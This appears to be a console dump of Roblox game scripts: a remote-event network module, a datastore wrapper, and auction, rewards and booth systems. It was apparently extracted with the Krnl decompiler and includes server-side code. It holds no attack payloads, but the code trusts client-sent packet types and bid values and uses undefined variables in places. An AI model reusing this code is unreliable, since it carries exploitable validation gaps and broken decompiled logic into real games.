			remoteName,				<--	|REQ|	Remote name																		
			...,					<-- 		Anything :)							
		)
--]]
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-- | load library | --
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Library = ReplicatedStorage:WaitForChild("Library")

-- | shared modules | --
local Signal = require(Library.Signal)

--------|       Top       |--------
local Network = {}

--------|     Setting     |--------
local Debug = false -- track 

--------|    Reference    |--------
local isServer = game:GetService("RunService"):IsServer()
local things = workspace:WaitForChild("__THINGS")
local remotes = things:WaitForChild("__REMOTES")
local mainRemote = remotes:WaitForChild("MAIN")

--------|    Variables    |--------
local queue = {}
local lastQueue = tick()
local events = {}
local listening = {}

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


--- Fire
Network.Fire = function(remoteName, arg, ...)
	--- Variables
	remoteName = string.lower(remoteName)

	--- Get/create remote
	local remote = GetRemote(remoteName)

	--- Signal for visualization/tracking purposes on Debug (Client only)
	if not isServer then
		Signal.Fire("CORE Network Fire", remoteName)
	end
	
	-- dssd
	if Debug then
		warn("Network Debug .Fire | " .. remoteName)
	end

	--- Create packet with arguments
	if isServer then
		--- Server
		local packet = CreatePacket(...)
		local player = arg

		--- Check if player is past intro
		if not player:FindFirstChild("__LOADED") then
			return
		end

		--- Send
		remote:FireClient(player, packet)

	else
		--- Client
		local packet = CreatePacket(arg, ...)

		--- Send
		remote:FireServer(packet)
	end
end

--- Fire (everyone)
Network.FireAll = function(remoteName, ...)
	--- Variables
	remoteName = string.lower(remoteName)
	
	--- Get/create remote
	local remote = GetRemote(remoteName)
	
	-- dssd
	if Debug then
		warn("Network Debug .FireAll | " .. remoteName)
	end

	--- Create packet with arguments
	local packet = CreatePacket(...)

	--- Get a list of players loaded past intro (that we can fire event on)
	local players = game.Players:GetPlayers()
	local playersToSend = {}
	--
	for _, player in ipairs(players) do
		if player:FindFirstChild("__LOADED") then
			table.insert(playersToSend, player)
		end
	end

	--- Send
	if #playersToSend >= #players then
		--- Can use optimized FireAllClients
		remote:FireAllClients(packet)

	else
		--- Some players are in intro, so we gotta fire each manually
		for _, player in ipairs(playersToSend) do
			coroutine.wrap(function()
				remote:FireClient(player, packet)
			end)()
		end
	end
end

--- Invoke
Network.Invoke = function(remoteName, arg, ...)
	--- Variables
	remoteName = string.lower(remoteName)
	
	
	--- Get/create remote
	local remote = GetRemote(remoteName, true)
	
	-- dssd
	if Debug then
		warn("Network Debug .Invoke | " .. remoteName)
	end
	
	--- Signal for visualization/tracking purposes on Debug (Client only)
	if not isServer then
		Signal.Fire("CORE Network Invoke", remoteName)
	end

	--- Create packet with arguments
	if isServer then
		--- Server
		local packet = CreatePacket(...)
		local player = arg

		--- Check if player is past intro
		if not player:FindFirstChild("__LOADED") then
			return
		end

		--- Return decoded packet
		return DecodePacket(remote:InvokeClient(arg, packet))

	else
		--- Client
		local packet = CreatePacket(arg, ...)

		--- Return decoded packet
		return DecodePacket(remote:InvokeServer(packet))
	end
end


--- On Fire
Network.Fired = function(remoteName)
	--- Variables
	remoteName = string.lower(remoteName)

	--- Get/create bindableEvent
	local event = GetEvent(remoteName)
	
	-- dssd
	if Debug then
		warn("Network Debug .Fired | " .. remoteName)
	end
	
	--
	return event.Event
end


--- On Invoke
Network.Invoked = function(remoteName)
	--- Variables
	remoteName = string.lower(remoteName)

	--- Get/create bindableFunction
	local event = GetEvent(remoteName, true)
	
	-- dssd
	if Debug then
		warn("Network Debug .Invoked | " .. remoteName)
	end
	
	--
	return event
end

--- Packet recieved from server/client
Network.Recieve = function(packetType, ...)
	--- Variables
	local data = {...}

	--- Direct packet info based on packetType
	if packetType == "a" then
		--- SERVER | Create remote event
		GetRemote(unpack(data))

	elseif packetType == "b" then
		--- SERVER | Create remote function
		GetRemote(unpack(data), true)

	elseif packetType == "c" then
		--- CLIENT | Recieved event
		local remoteName, packet = unpack(data)
		local event = GetEvent(remoteName)
		event:Fire(DecodePacket(packet))

	elseif packetType == "d" then
		--- CLIENT | Recieved invoke
		local remoteName, packet = unpack(data)
		local event = GetEvent(remoteName, true)
		return CreatePacket(event:Invoke(DecodePacket(packet)))

	elseif packetType == "e" then
		--- SERVER | Recieved event
		local remoteName, player, packet = unpack(data)
		local event = GetEvent(remoteName)
		event:Fire(player, DecodePacket(packet))

	elseif packetType == "f" then
		--- SERVER | Recieved invoke
		local remoteName, player, packet = unpack(data)
		local event = GetEvent(remoteName, true)
		return CreatePacket(event:Invoke(player, DecodePacket(packet)))

	else
		--- packetType returned doesn't exist :(
		warn("_L.Network.Recieve | Corrupted packet (packet type recieved as " .. packetType .. ")")
	end
end


----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--- Turn series of arguments into compressed 'packet'
function CreatePacket(...)
	local newPacket = { {}, {} }
	local newPacketData = newPacket[1]
	local newPacketIndex = newPacket[2]
	
	return { ... }
end


--- Decode previously encoded packet into a series of readable arguments
function DecodePacket(packet)
	--- Variables
	local newData = {}
	
	return unpack(packet)
end


--- Get (or create) BindableEvent / BindableFunction
function GetEvent(remoteName, isRemoteFunction)
	--- Variables
	remoteName = string.lower(remoteName)
	local event = events[remoteName]

	--- Check if event already exists
	if not event then
		--- Create event
		event = Instance.new(isRemoteFunction and "BindableFunction" or "BindableEvent")
		event.Name = string.reverse(remoteName)
		event.Parent = script
		events[remoteName] = event
	end

	--
	return event
end


--- Get (or create) RemtoeEvent / RemoteFunction
function GetRemote(remoteName, isRemoteFunction)
	--- Variables
	remoteName = string.lower(remoteName)
	local remote = remotes:FindFirstChild(remoteName)

	--- Check if remote already exists
	if not remote then
		if isServer then
			--- Server -> create remote
			remote = Instance.new(isRemoteFunction and "RemoteFunction" or "RemoteEvent")
			remote.Name = remoteName
			remote.Parent = remotes

			--- Track remote traffic
			ListenRemote(remoteName, isRemoteFunction)
		else
			--- Client -> Tell server to create remote
			mainRemote:FireServer((isRemoteFunction and "b" or "a"), remoteName)

			--- Wait for remote to exist
			repeat game:GetService("RunService").RenderStepped:Wait() until remotes:FindFirstChild(remoteName)
			remote = remotes:FindFirstChild(remoteName)

			--- Track remote traffic
			ListenRemote(remoteName, isRemoteFunction)
		end
	end

	return remote
end


--- Listen for data from remotes
function ListenRemote(remoteName, isRemoteFunction)
	--- Variables
	remoteName = string.lower(remoteName)
	local remote = GetRemote(remoteName, isRemoteFunction)

	--- Check if remote is already being tracked
	if not listening[remoteName] then
		listening[remoteName] = true
	else
		return
	end

	--- Listen to remote
	if isServer then
		--- Server
		if isRemoteFunction then
			--- Remote function
			function remote.OnServerInvoke(player, ...)
				return Network.Recieve("f", remoteName, player, ...)
			end

		else
			--- Remote event
			remote.OnServerEvent:Connect(function(player, ...)
				Network.Recieve("e", remoteName, player, ...)
			end)
		end

	else
		--- Client
		if isRemoteFunction then
			--- Remote function
			function remote.OnClientInvoke(...)
				--- Signal for visualization/tracking purposes on Debug (Client only)
				if not isServer then
					Signal.Fire("CORE Network Invoked", remoteName)
				end

				--
				return Network.Recieve("d", remoteName, ...)
			end

		else
			--- Remote event
			remote.OnClientEvent:Connect(function(...)
				--- Signal for visualization/tracking purposes on Debug (Client only)
				if not isServer then
					Signal.Fire("CORE Network Fired", remoteName)
				end

				--
				Network.Recieve("c", remoteName, ...)
			end)
		end
	end
end


--- Initailize client
function ClientInit()
	--- Scan all remotes
	for _, remote in ipairs(remotes:GetChildren()) do
		if remote.Name ~= "MAIN" then
			--- Listen for traffic
			ListenRemote(remote.Name, remote:IsA("RemoteFunction"))
		end
	end
end


--- First time
if isServer then
	--- If server, listen for any traffic from MAIN remote
	mainRemote.OnServerEvent:Connect(function(player, packetType, remoteName, ...)
		Network.Recieve(packetType, remoteName, ...)
	end)

else
	--- If client, initailize
	coroutine.wrap(function()
		wait()
		ClientInit()
	end)()
end


--- Listen in on newly added remotes
remotes.ChildAdded:Connect(function(remote)
	if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
		ListenRemote(remote.Name, remote:IsA("RemoteFunction"))
	end
end)


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

return Network  -  Editar
  04:54:13.764    -  Editar
  04:54:13.764  ----- [2321] ReplicatedStorage.__DATASTORE -----  -  Editar
  04:54:13.764  --[[
    
    Datastore module
    This module will either get a Firebase(global saving)
    or the normal Roblox database.
    
]]--[[Variables]]--
local IsServer             = game:GetService("RunService"):IsServer()
local Enabled              = game:GetService("ReplicatedStorage"):GetAttribute("Firebase")
local DataStoreService     = game:GetService("DataStoreService")
local ServerScriptService  = IsServer and game:GetService("ServerScriptService") or nil
local FirebaseService      = IsServer and require(ServerScriptService["__FIREBASE"]) or nil
-------------------------------------------------------------------------------------------------------------------------------

if not Enabled then
	return game:GetService("DataStoreService")
end

if IsServer then
	return FirebaseService
else
	return DataStoreService
end
-------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------  -  Editar
  04:54:13.764    -  Editar
  04:54:13.764  ----- [2322] ReplicatedStorage.EventCmds -----  -  Editar
  04:54:13.764  -- Decompiled using Krnl
local v6 = game:GetService("Players")
local v9 = (game:GetService("ReplicatedStorage")):WaitForChild("Library")
local v12 = v9:WaitForChild("Client")
local v18 = require(v9.Directory)
local v21 = require(v9.Shared)
local v24 = require(v9.Functions)
local v27 = require(v12.Save)
local v30 = require(v12.Network)
local v33 = require(v9:WaitForChild("Types").Events)
local v34 = {
	Directory = v18.Events,
	Get = function(p1, p2)
        assert(v18.Events[p1])
        local v43, v44 = unpack(string.split(p2, "-"))
        assert(v43)
        local v47 = v44
        if v47 then
            if typeof(v44) ~= "string" then
                v47 = false
            end
            v47 = true
        end
        assert(v47)
        local v54 = tonumber(v44)
        v50 = v54
        assert(v50)
        local v56 = v18
        local v57 = v56.Events
        assert(v57[p1][v43][v54])
        local v61 = v27
        local v63 = v61.Get()
        if not v63 then
            v57 = v33
            v61 = v57.DefaultData
            return v61
        end
        local v72 = v63.Events[p1]
        if not v72 then
            v56 = v33.DefaultData
            return v56
        end
        local v66 = v72[p2]
        if not v66 then
            v65 = v33.DefaultData
            return v65
        end
        return v66
    end
}
v34.GetPoints = function()
local v74 = v27
local v76 = v74.Get()
if not v76 then
	v74 = 0
	return v74
end
return v76.Stars or 0
end
v30.Fired("Events: Update"):Connect(function(p3, p4, p5)
    local v84 = v27.Get()
    if not v84 then
        return 
    end
    local v91 = v84.Events
    local v85 = v91[p3]
    if not v85 then
        v85 = {}
        v91[p3] = v85
    end
    assert(v85)
    v85[p4] = p5
    v21.SignalStatUpdated(v6.LocalPlayer, "Events")
end)
v30.Fired("Events: Reset"):Connect(function(p6, p7)
    local v100 = v27.Get()
    if not v100 then
        return 
    end
    local v107 = v100.Events
    local v101 = v107[p6]
    if not v101 then
        v101 = {}
        v107[p6] = v101
    end
    assert(v101)
    v100.EventsRewardStage[p6] = 0
    v21.SignalStatUpdated(v6.LocalPlayer, "Events")
end)
v30.Fired("Events: Complete"):Connect(function(p8, p9, p10)
    local v121, v122 = unpack(string.split(p10, "-"))
    assert(v121)
	assert(typeof(v122) == "string")
    local v132 = tonumber(v122)
	assert(v132)
    assert(v18.Events[p9][v121][v132])
end)
return v34
  -  Editar
  04:54:13.764    -  Editar
  04:54:13.764  ----- [2323] ServerScriptService.Scripts.Game.Auction [OLD] -----  -  Editar
  04:54:13.764  

--[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------
local auctionTime = 60
local tax = 0.70
local auctioningCost = 100_000_000

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------
local auctions = {}

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------


if not _L.Shared.IsTradingPlaza then -- Why would you need auction running in a normal game
    return
end

local function getList()
    local list = {}
    
    for i, plyr in ipairs(game.Players:GetPlayers()) do
        local t = _L.Signal.Invoke("Auction: Get Plyr", plyr)
        if t or auctions[plyr.UserId] then
            if t then
                table.insert(list, t)
				auctions[plyr.UserId] = t
            else
				table.insert(list, auctions[plyr.UserId])
            end    
        end
    end
    
    if #list < 1 then
        return false
    end
    
    return list
end

local function conv(a)
    local arr = {}
    for i, v in pairs(a) do
		table.insert(arr, v)
    end
	return arr
end

function GetCurrentAuction()
    local tbl = conv(auctions)
    
    if #tbl == 0 or tbl[1].Completed or not tbl[1].EndTime then
        return nil
    end
    
    return tbl[1]
end

_L.Network.Invoked("Auction: List").OnInvoke = function(plyr)
   -- repeat wait() until _L.Network.Invoke("Has Loaded", plyr) == true
	_G.HasLoaded(plyr)
	
    return getList()
end

_L.Signal.Invoked("Auction: Get Plyr").OnInvoke = function(plyr)
	return auctions[plyr.UserId] or nil
end

_L.Network.Invoked("Auction: Create").OnInvoke = function(plyr, uid, petPrice)
    uid        =    tostring(uid)
    petPrice   =    tonumber(petPrice)
    
    local save = _L.Saving.Get(plyr)
    if not save then
        return
    end
    
	if auctions[plyr.UserId] or not uid or not petPrice then
        return 
    end
    
    if #save.Pets - 1 < 1 then
        return false, "You need atleast 1 pet in your inventory!"
    end
    
    local pet = _L.Pets.Get(uid)
    if not pet then
        return
    end
        
    if save.Diamonds < auctioningCost then
        return false, "You need " .. _L.Functions.Commas(auctioningCost - save.Diamonds) .. " more Diamonds!"
    end
    
    save.Diamonds = save.Diamonds - auctioningCost
    
	auctions[plyr.UserId] = {
        Id = uid,
        PetData = pet,
        MinimumBidAmount = petPrice,
        UserId = plyr.UserId,
        UserName = plyr.Name,
        auctionTime = os.clock()
    }
    _L.Pets.Delete(uid)
    
	_L.Network.FireAll("Auction: Update", auctions[plyr.UserId])
    
    return true
end

local function checkAuctionBid(bid, curAuction)
    local curBid = curAuction.CurrentBid
    if curAuction.CurrentBid then
		if bid >= curBid.Amount + math.ceil(curBid.Amount * 0.01) then
            return true
        end
    else
        if bid >= curAuction.MinimumBidAmount then
            return true
        end
    end
    
    return false
end

_L.Network.Invoked("Auction: Bid").OnInvoke = function(plyr, id, bid)
    local save = _L.Saving.Get(plyr)
    if not save then
        return false, 'no save'
    end
    
    if save.Diamonds < bid then
       return false, "You don't have enough Diamonds!" 
    end
    
    local curAuction = GetCurrentAuction()
    if not curAuction then
        return nil, "no current auction"
    end
    
    if curAuction.Id ~= id then
        return nil, "aution id doesnt match"
    end
    
    if not checkAuctionBid(bid, curAuction) then
        return nil, 'You cannot bid this amount of diamonds!'
    end
    
    if curAuction.CurrentBid ~= nil then
        table.insert(curAuction.PreviousBids, curAuction.CurrentBid)
    end
    
    curAuction.CurrentBid = { UserName = plyr.Name, UserId = plyr.UserId, Amount = bid }
    
    _L.Network.FireAll("Auction: Update", curAuction)
    
    return true
end

_L.Signal.Fired("Player Added"):Connect(function(plyr)
    coroutine.wrap(function() -- TODO: check if auction finishes
		while wait(1) do
			if not plyr or not plyr.Parent then
				break
			end
			
            local curAuction = GetCurrentAuction()
            if curAuction then
                if curAuction.EndTime and curAuction.EndTime <= workspace:GetServerTimeNow() then
                    curAuction.Completed = true
					auctions[curAuction.UserId] = nil                    
                    
                    _L.Network.FireAll("Auction: Update", curAuction)
                    
					if curAuction.UserId == plyr.UserId then
						local sender = game.Players:GetPlayerByUserId(curAuction.UserId)
						local target = curAuction.CurrentBid and game.Players:GetPlayerByUserId(curAuction.CurrentBid.UserId) or nil
						local bid = curAuction.CurrentBid and curAuction.CurrentBid.Amount or nil
                        
                        local petData = curAuction.PetData
                        if not target or not bid then
                            _L.Pets.Create(sender, petData.id, petData, nil, true)
                            _L.Print("[bold] NO AUCTION RETURNING AUCTIONED ITEMS [/bold]")
                            return
						end
						
						local senderSave = _L.Saving.Get(sender)
						local targetSave = _L.Saving.Get(target)
                        
                        if not targetSave or not senderSave then
                            _L.Pets.Create(sender, petData.id, petData, nil, true)
                            _L.Print("[bold] HUGE ISSUE WITH AUCTIONING DATA [/bold]")
                            return
                        end
                        
                        _L.Pets.Create(target, petData.id, petData, nil, true)
                        targetSave.Diamonds = targetSave.Diamonds - bid
						senderSave.Diamonds = senderSave.Diamonds + (bid * tax)
						
						local function computeRAP(rap, a)
							a = a*0.1
							
							if rap > a then
								return RNG:NextNumber(a, rap)
							else
								return RNG:NextNumber(rap, a)
							end
						end
						
						task.spawn(function()
							local key = _L.RAPShared.EncodeKey(petData)
							if key then
								local RAP = _L.Signal.Invoke("RAP: Get Pet", plyr, key)
								if RAP then
									local newRAP = RAP>=1 and computeRAP(RAP, bid) or bid*0.1
									_L.Signal.Fire("RAP: Update", plyr, {
										[petData.id] = {
											val = newRAP
										}
									})
								end
							end
						end)
                    end
                end
            end
        end
    end)()
    
    coroutine.wrap(function() -- TODO: auction current list
		while wait(7.5) do
			if not plyr or not plyr.Parent then
				break
			end
			
            local list = getList()
            
            if list then
                -- DEBUG --
                for i, v in ipairs(list) do
                    if not v.auctionTime then
                        list[i] = nil
                    end
                end
                
                table.sort(list, function(i, v)
                    return i.auctionTime < v.auctionTime
                end)
                
                local curAuction = GetCurrentAuction()
                
                if not curAuction and #list > 0 then
                    local auctioning = list[1]
                    
                    if auctioning then
                        auctioning.EndTime = workspace:GetServerTimeNow() + auctionTime
                        auctioning.PreviousBids = {}
                        auctioning.CurrentBid = nil 
                        
                        _L.Network.FireAll("Auction: Update", auctioning)
                    end
                end
            end
        end
    end)()
    
end)


-- end auction if player leaves.
game.Players.PlayerRemoving:Connect(function(player)
	local Auction = GetCurrentAuction()
	if Auction then
		if Auction.UserId == player.UserId then
			local sender = game.Players:GetPlayerByUserId(Auction.UserId)
			local petData = Auction.PetData
			local senderSave = _L.Saving.Get(sender)
			_L.Pets.Create(sender, petData.id, petData, nil, true)
			Auction.EndTime = os.time()
			Auction.Completed = true
		end
	end
end)  -  Editar
  04:54:13.766    -  Editar
  04:54:13.766  ----- [2324] ServerScriptService.Scripts.Game.PSZRewards -----  -  Editar
  04:54:13.766  local _L = require(game.ReplicatedStorage:WaitForChild("Library")) _L.Load()

local FirebaseService = require(game.ServerScriptService.__FIREBASE)
local datastore = FirebaseService:GetDataStore("Global")

PLAYER_CACHE = {}
function GetPlayer(plr)
	if PLAYER_CACHE[tostring(plr.UserId)] then
		return PLAYER_CACHE[tostring(plr.UserId)]
	end

	local success, response = pcall(function()
		return datastore:GetAsync(tostring(plr.UserId))
	end)
	if not success then
		return
	end

	if response == nil then
		--[[PLAYER_CACHE[tostring(plr.UserId)] = {
			EarnedRewards = {
				["Reward-1"] = false;
				["Reward-2"] = false;
				["Reward-3"] = false;
				["Reward-4"] = false;
				["Reward-5"] = false;
				["Reward-6"] = false;
				["Reward-7"] = false;
				["Reward-8"] = false;
			};
			Points = 0 -- track
		}
		return PLAYER_CACHE[tostring(plr.UserId)]]--
        return nil
	end

	PLAYER_CACHE[tostring(plr.UserId)] = _L.HttpService:JSONDecode(response)
	return PLAYER_CACHE[tostring(plr.UserId)]
end

local Rewards = {
	["Reward-1"] = {
		reward = "1027",
		quantity = 2,
		extrapetdata = {},
		badge = 2150460165
	},
	["Reward-2"] = {
		reward = "2008",
		quantity = 1,
		extrapetdata = {},
		badge = 0
	},
	["Reward-3"] = {
		reward = "2011",
		quantity = 2,
		extrapetdata = {},
		badge = 0
	},
	["Reward-4"] = {
		reward = "2045",
		quantity = 2,
		extrapetdata = {["g"] = true},
		badge = 0
	},
	["Reward-5"] =  {
		reward = "2050",
		quantity = 1,
		extrapetdata = {["r"] = true},
		badge = 0
	},
	["Reward-6"] = {
		reward = "3000",
		quantity = 1,
		extrapetdata = {},
		badge = 0
	},
	["Reward-7"] = {
		reward = "3023",
		quantity = 2,
		extrapetdata = {["g"] = true},
		badge = 0
	},
	["Reward-8"] = {
		reward = "3003",
		quantity = 2,
		extrapetdata = {["r"] = true},
		badge = 0
	},
}

local SerialDB = _L.DataStoreService:GetDataStore("Rewards" .. _L.Settings.StatsVersion)
function GetSerial(reward)
	task.wait(0.2) -- wait for update
	local am = SerialDB:GetAsync(tostring(reward)) or 0
	local new = am + 1
	SerialDB:SetAsync(tostring(reward), new)
	return new
end

function CheckRewards(player)
	local save = _L.Saving.Get(player)
	if not save then
		return
	end
	
	local data = GetPlayer(player)
	if not data then
		return
	end
	
	for i, v in pairs(Rewards) do
		--if _L.BadgeService:UserHasBadgeAsync(player.UserId, v.badge) then
		--	if not save.Debug[i] then
		--		for i = 1, v.quantity do
		--			_L.Pets.Create(player, v.reward, v.extrapetdata)
		--		end
		--		save.Debug[i] = true
		--	end	
		--end
		
		if not save["PSZRewards"] then
			save["PSZRewards"] = {
				["Reward-1"] = false;
				["Reward-2"] = false;
				["Reward-3"] = false;
				["Reward-4"] = false;
				["Reward-5"] = false;
				["Reward-6"] = false;
				["Reward-7"] = false;
				["Reward-8"] = false;
			};
		end
		
		local notify = false
		if data.EarnedRewards[i] == true then
			if not save["PSZRewards"][i] then
				notify = true
				for i = 1, v.quantity do
					local data = v.extrapetdata
					if v ~= "Reward-1" then
						
					end
					data.merchData = {
						["serial"] = GetSerial(i), 
						["user"] = player.UserId,
						["code"] = "PSXMRewards"
					}
					_L.Pets.Create(player, v.reward, v.extrapetdata)
				end
				--_L.Network.Fire("Message", player, "You got a reward from PSXM Rewards! Check your inventory :)")
				save["PSZRewards"][i] = true
			end	
		end
		if notify then
			_L.Network.Fire("Notification", player, "You have recieved some new rewards from PSZ Rewards!", {time = 5, color = Color3.fromRGB(0, 255, 0), force = true})
		end
	end
end

_L.Signal.Fired("Player Added"):Connect(function(player)
	local save = _L.Saving.Get(player)
	--while player and player.Parent do
		CheckRewards(player)
		--_L.Heartbeat(1)
	--end
end)  -  Editar
  04:54:13.766    -  Editar
  04:54:13.767  ----- [2325] ServerScriptService.Scripts.Game.Booths [OLD] -----  -  Editar
  04:54:13.767  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------
local allClaimedBooths = {}
local OS = {}

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

if not _L.Shared.IsTradingPlaza then
    return
end

local function getAllBooths()
    local allBooths = {}

    for i, plyr in ipairs(game.Players:GetPlayers()) do
        local t = _L.Signal.Invoke("Get Plyr Booth", plyr)
        if t or allClaimedBooths[plyr] then
            if t then
                table.insert(allBooths, t)
                allClaimedBooths[plyr] = t
            else
                table.insert(allBooths, allClaimedBooths[plyr])
            end    
        end
    end

    return allBooths
end

